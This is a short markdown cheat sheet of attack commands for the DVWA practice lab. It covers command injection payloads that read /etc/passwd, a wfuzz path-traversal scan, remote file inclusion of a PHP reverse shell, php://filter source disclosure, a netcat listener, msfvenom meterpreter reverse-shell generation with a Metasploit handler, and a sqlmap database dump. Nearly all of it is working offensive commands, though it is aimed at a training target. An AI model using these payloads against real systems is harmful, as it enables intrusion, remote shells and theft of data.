## Brute force
Get token from html hidden box 
## Command Injection
Medium 127.0.0.1| cat /etc/passwd
Hight 8.8.8.8|pwd
; && || | &
## Cross Site Request Forgery (CSRF)
token=1

## File Inclusion
Scan files
`wfuzz -c --hl 81 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -b "security=low; PHPSESSID=a0bf6sa3dqu1hhrbrcd13f6rko" "http://192.168.1.209/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"`

### injectable webfiles
/usr/share/laudanum/php/php-reverse-shell.php 

http://192.168.1.209/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:9000/shell.php
### download php website
http://192.168.1.209/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../hackable/flags/fi.php

file:///etc/passwd 

## File Upload

#### PyLocalServer
sudo python -m http.server 1337
sudo python2 -m SimpleHTTPServer 1337

#### Listen remote Shell 
nc -nlvp 1337 

weevely
msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=4444 -f raw > exploit.php
msfconsole
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set lhost 127.0.0.1

### Sql injection 
sqlmap -r request.txt -p id --dump

